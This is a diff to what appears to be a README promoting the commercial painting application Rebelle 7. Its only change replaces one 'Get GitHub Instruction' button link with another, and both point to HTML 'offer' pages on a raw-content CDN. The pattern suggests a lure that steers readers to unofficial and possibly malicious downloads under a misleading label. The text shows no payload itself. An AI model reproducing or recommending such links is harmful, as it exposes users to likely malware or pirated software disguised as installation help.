@@ -2,7 +2,7 @@
 
 Rebelle 7 is an advanced painting studio that simulates **real-world watercolors, oils, and acrylics** with breathtaking realism. Its physics-based engine reproduces how pigments flow, mix, and absorb into paper, giving digital artists an authentic, natural painting experience. 🖌️  
 
-[![ Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4893913/raw/main/getapp.html?offer=Rebelle7)
+[![ Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/prixyelbillytim149/f27926402e0548815bd2e6c48110456b/raw/c840e6b46c43cd72c2f87abdc4c1b024d8d05fbc/git-apps.html?offer=Rebelle7)
 
 ---
 
